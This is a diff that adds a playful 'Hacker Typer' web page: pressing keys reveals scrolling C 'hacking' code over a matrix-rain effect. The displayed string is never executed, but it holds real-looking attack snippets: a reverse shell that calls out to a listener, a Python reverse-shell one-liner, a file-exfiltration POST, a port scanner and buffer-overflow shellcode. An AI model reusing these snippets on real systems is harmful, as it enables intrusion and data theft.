@@ -1,0 +1,258 @@
+﻿<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacker Typer | 4ayka Studio</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --green: #00ff41; --green-dark: #003b00; --bg: #0a0a0a; --font: 'Fira Code', monospace; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: var(--bg); color: var(--green); font-family: var(--font); height: 100vh; overflow: hidden; cursor: none; }
+        #canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.06; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15) 0px, rgba(0,0,0,0.15) 1px, transparent 1px, transparent 3px); pointer-events: none; }
+        #code { position: relative; z-index: 2; padding: 2rem; font-size: 0.8rem; line-height: 1.5; height: 100vh; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
+        #code::-webkit-scrollbar { width: 4px; }
+        #code::-webkit-scrollbar-thumb { background: var(--green-dark); }
+        .cursor-fake { display: inline-block; width: 8px; height: 14px; background: var(--green); animation: blink 1s step-end infinite; vertical-align: text-bottom; }
+        @keyframes blink { 50% { opacity: 0; } }
+        .prompt { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%); z-index: 10; color: var(--green-dark); font-size: 0.8rem; text-align: center; animation: fade 2s ease-in-out infinite; }
+        @keyframes fade { 0%,100% { opacity: 0.3; } 50% { opacity: 0.8; } }
+        .header { position: fixed; top: 0; left: 0; width: 100%; z-index: 10; display: flex; justify-content: space-between; align-items: center; padding: 1rem 2rem; background: rgba(10,10,10,0.9); border-bottom: 1px solid #1a1a1a; }
+        .logo { font-size: 1rem; letter-spacing: 3px; text-shadow: 0 0 10px var(--green-dark); }
+        .back { color: #555; text-decoration: none; font-size: 0.75rem; transition: color 0.3s; cursor: pointer; }
+        .back:hover { color: var(--green); }
+        .stats { position: fixed; bottom: 2rem; right: 2rem; z-index: 10; font-size: 0.7rem; color: var(--green-dark); text-align: right; }
+        #counter { color: var(--green); font-size: 1.2rem; }
+        .access { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 20; font-size: 2rem; color: var(--green); text-shadow: 0 0 30px var(--green), 0 0 60px var(--green-dark); text-align: center; display: none; letter-spacing: 4px; animation: pulse2 0.5s ease-in-out; }
+        @keyframes pulse2 { 0% { transform: translate(-50%, -50%) scale(0.5); opacity: 0; } 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; } }
+    </style>
+</head>
+<body>
+    <canvas id="canvas"></canvas>
+    <div class="overlay"></div>
+    <div class="header">
+        <div class="logo">HACKER_TYPER</div>
+        <a class="back" href="index.html">&lt; back</a>
+    </div>
+    <div id="code"></div>
+    <div class="prompt">НАЖИМАЙ ЛЮБУЮ КЛАВИШУ</div>
+    <div class="stats">KEYS PRESSED: <span id="counter">0</span></div>
+    <div class="access" id="access">ACCESS GRANTED</div>
+
+    <script>
+        const codeEl = document.getElementById('code');
+        const counterEl = document.getElementById('counter');
+        const accessEl = document.getElementById('access');
+        let count = 0;
+        let charIndex = 0;
+
+        const hackCode = `#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <openssl/evp.h>
+#include <openssl/aes.h>
+#include <pthread.h>
+
+#define PORT 4444
+#define BUFFER 4096
+
+typedef struct {
+    int sock;
+    struct sockaddr_in addr;
+} connection_t;
+
+void xor_encrypt(char *data, int len, char *key, int klen) {
+    for (int i = 0; i < len; i++)
+        data[i] ^= key[i % klen];
+}
+
+int scan_target(const char *ip, int port) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in target;
+    target.sin_family = AF_INET;
+    target.sin_port = htons(port);
+    inet_pton(AF_INET, ip, &target.sin_addr);
+    if (connect(sock, (struct sockaddr*)&target, sizeof(target)) < 0)
+        return 0;
+    close(sock);
+    return 1;
+}
+
+void reverse_shell(const char *lhost, int lport) {
+    int sock;
+    struct sockaddr_in addr;
+    char buffer[BUFFER];
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(lport);
+    inet_pton(AF_INET, lhost, &addr.sin_addr);
+    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
+    dup2(sock, 0);
+    dup2(sock, 1);
+    dup2(sock, 2);
+    execl("/bin/sh", "sh", NULL);
+}
+
+void exploit_buffer_overflow(char *target, int port) {
+    char payload[1024];
+    char shellcode[] = "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"
+                       "\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50"
+                       "\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80";
+    memset(payload, 0x90, sizeof(payload));
+    memcpy(payload + sizeof(payload) - sizeof(shellcode) - 20, shellcode, sizeof(shellcode));
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    inet_pton(AF_INET, target, &addr.sin_addr);
+    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
+    send(sock, payload, sizeof(payload), 0);
+    close(sock);
+}
+
+void port_scan(const char *subnet) {
+    char ip[16];
+    int ports[] = {21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 993, 995, 3306, 3389, 5432, 8080, 8443};
+    printf("[+] Scanning %s\\n", subnet);
+    for (int h = 1; h < 255; h++) {
+        sprintf(ip, "%s.%d", subnet, h);
+        for (int i = 0; i < 18; i++) {
+            if (scan_target(ip, ports[i]))
+                printf("[OPEN] %s:%d\\n", ip, ports[i]);
+        }
+    }
+}
+
+void decrypt_aes256(unsigned char *ciphertext, int ct_len, unsigned char *key) {
+    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+    unsigned char iv[16] = {0};
+    unsigned char plaintext[1024];
+    int len;
+    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
+    EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ct_len);
+    EVP_DecryptFinal_ex(ctx, plaintext + len, &len);
+    EVP_CIPHER_CTX_free(ctx);
+    printf("[+] Decrypted: %s\\n", plaintext);
+}
+
+void generate_payload(char *host, int port) {
+    char buf[512];
+    snprintf(buf, sizeof(buf),
+        "python3 -c 'import socket,os,pty;"
+        "s=socket.socket();"
+        "s.connect((\"%s\",%d));"
+        "os.dup2(s.fileno(),0);"
+        "os.dup2(s.fileno(),1);"
+        "os.dup2(s.fileno(),2);"
+        "pty.spawn(\"/bin/sh\")'",
+        host, port);
+    printf("[+] Payload generated\\n%s\\n", buf);
+}
+
+void hash_password(const char *input, char *output) {
+    unsigned char hash[SHA256_DIGEST_LENGTH];
+    SHA256((unsigned char*)input, strlen(input), hash);
+    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++)
+        sprintf(output + (i * 2), "%02x", hash[i]);
+    output[64] = 0;
+}
+
+void exfiltrate_data(const char *target, const char *file) {
+    FILE *fp = fopen(file, "r");
+    if (!fp) return;
+    char data[4096];
+    fread(data, 1, sizeof(data), fp);
+    fclose(fp);
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(80);
+    inet_pton(AF_INET, target, &addr.sin_addr);
+    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
+    char req[5000];
+    snprintf(req, sizeof(req), "POST /exfil HTTP/1.1\\r\\nHost: %s\\r\\nContent-Length: %d\\r\\n\\r\\n%s", target, strlen(data), data);
+    send(sock, req, strlen(req), 0);
+    close(sock);
+}
+
+int main(int argc, char *argv[]) {
+    printf("4AYKA STUDIO - INTERNAL TOOL v3.1\\n");
+    printf("==================================\\n");
+    if (argc < 2) {
+        printf("Usage: %s <target>\\n", argv[0]);
+        return 1;
+    }
+    printf("[+] Target: %s\\n", argv[1]);
+    printf("[+] Initializing exploit framework...\\n");
+    port_scan(argv[1]);
+    generate_payload(argv[1], 4444);
+    printf("[+] Access granted. System compromised.\\n");
+    return 0;
+}`;
+
+        function addChars(count) {
+            let added = '';
+            for (let i = 0; i < count && charIndex < hackCode.length; i++) {
+                added += hackCode[charIndex];
+                charIndex++;
+            }
+            if (added) {
+                codeEl.innerHTML += added;
+                codeEl.scrollTop = codeEl.scrollHeight;
+            }
+            if (charIndex >= hackCode.length && count > 50) {
+                showAccess();
+            }
+        }
+
+        function showAccess() {
+            accessEl.style.display = 'block';
+            setTimeout(() => { accessEl.style.display = 'none'; }, 3000);
+            charIndex = 0;
+            codeEl.innerHTML = '';
+        }
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key.length === 1 || e.key === 'Tab') {
+                e.preventDefault();
+                addChars(3);
+                count++;
+                counterEl.textContent = count;
+                document.querySelector('.prompt').style.display = 'none';
+            }
+            if (e.key === 'Escape') {
+                showAccess();
+            }
+        });
+
+        // MATRIX RAIN
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+        resize();
+        window.addEventListener('resize', resize);
+        const chars = '01アイウエオカキクケコサシスセソタチツテト';
+        const fs = 14;
+        let cols = Math.floor(canvas.width / fs);
+        let drops = Array(cols).fill(1);
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(10,10,10,0.04)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#00ff41';
+            ctx.font = fs + 'px monospace';
+            for (let i = 0; i < drops.length; i++) {
+                ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * fs, drops[i] * fs);
+                if (drops[i] * fs > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 50);
+        window.addEventListener('resize', () => { cols = Math.floor(canvas.width / fs); drops = Array(cols).fill(1); });
+    </script>
+</body>
+</html>
